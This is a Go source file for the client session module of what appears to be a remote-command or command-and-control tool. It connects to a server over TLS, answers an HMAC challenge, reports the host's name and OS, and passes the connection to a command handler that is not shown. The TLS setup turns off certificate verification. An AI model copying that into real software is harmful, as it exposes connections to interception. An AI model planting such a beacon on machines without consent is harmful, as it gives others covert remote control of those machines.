package session

import (
	"crypto/hmac"
	"crypto/sha512"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"runtime"
	"src/Client/generic/config"
	"src/Client/generic/logger"
	"src/Client/session/protocol"
	"time"

	"github.com/google/uuid"
)

const (
	// ConnectionTimeout defines the timeout in seconds for establishing a connection.
	ConnectionTimeout = 10
)


// SessionHandler orchestrates the entire session lifecycle.
func SessionHandler() error {
	if !isHMACKeySet() {
		return fmt.Errorf("HMAC key is not set. Please provide it with the -hmac-key flag")
	}

	logger.Log("Session mode activated. Initiating connection and authentication.")

	conn, err := connectToServer()
	if err != nil {
		logger.Error(fmt.Sprintf("Connection failed: %v", err))
		return fmt.Errorf("failed to connect to server: %w", err)
	}
	defer conn.Close()
	logger.Log(fmt.Sprintf("Successfully connected to %s", config.SessionAddr))

	if err := performHMACAuthentication(conn); err != nil {
		logger.Error(fmt.Sprintf("Authentication failed: %v", err))
		return fmt.Errorf("failed to authenticate: %w", err)
	}
	logger.Log("Server authentication successful.")

	if err := sendClientInfo(conn); err != nil {
		logger.Error(fmt.Sprintf("Failed to send client info: %v", err))
		return fmt.Errorf("failed to send client info: %w", err)
	}
	_, _ = protocol.ReceiveData(conn) // place holder for shark listener
	commandHandler(conn)
	return nil
}

// isHMACKeySet checks if the HMAC key is provided and logs an error if not.
func isHMACKeySet() bool {
	if config.HMACKey == "" {
		logger.Error("HMAC key is required. Please provide it with the -hmac-key flag.")
		return false
	}
	return true
}

// connectToServer establishes a TLS connection to the server.
func connectToServer() (*tls.Conn, error) {
	tlsConfig := &tls.Config{InsecureSkipVerify: true}
	dialer := &net.Dialer{Timeout: ConnectionTimeout * time.Second}
	return tls.DialWithDialer(dialer, "tcp", config.SessionAddr, tlsConfig)
}

// performHMACAuthentication handles the challenge-response flow.
func performHMACAuthentication(conn net.Conn) error {
	logger.Log("Starting HMAC challenge-response flow...")

	// Receive challenge from the server
	challenge, err := protocol.ReceiveData(conn)
	if err != nil {
		return fmt.Errorf("failed to receive challenge: %w", err)
	}
	logger.Log("Received challenge from server.")

	// Compute and send the response
	response := computeHMAC(challenge, []byte(config.HMACKey))
	logger.Log("Computed and sending HMAC response.")
	if err := protocol.SendData(conn, []byte(response)); err != nil {
		return fmt.Errorf("failed to send response: %w", err)
	}

	return nil
}

// sendClientInfo gathers and transmits client system details to the server.
func sendClientInfo(conn net.Conn) error {
	logger.Log("Gathering and sending client information...")
	clientInfo := map[string]string{
		"Hostname": getHostname(),
		"OS":       getOS(),
		"ID":       getClientID(),
	}

	infoJSON, err := json.Marshal(clientInfo)
	if err != nil {
		return fmt.Errorf("failed to marshal client info: %w", err)
	}

	if err := protocol.SendData(conn, infoJSON); err != nil {
		return fmt.Errorf("failed to send client info: %w", err)
	}
	logger.Log("Client information sent successfully.")
	return nil
}

// computeHMAC generates an HMAC-SHA512 hash.
func computeHMAC(data, key []byte) string {
	h := hmac.New(sha512.New, key)
	h.Write(data)
	return hex.EncodeToString(h.Sum(nil))
}

// getHostname retrieves the system's hostname.
func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		logger.Error(fmt.Sprintf("Could not retrieve hostname: %v", err))
		return "unknown"
	}
	return hostname
}

// getOS retrieves the operating system name.
func getOS() string {
	return runtime.GOOS
}

// getClientID generates a unique client ID.
func getClientID() string {
	return uuid.New().String()
}
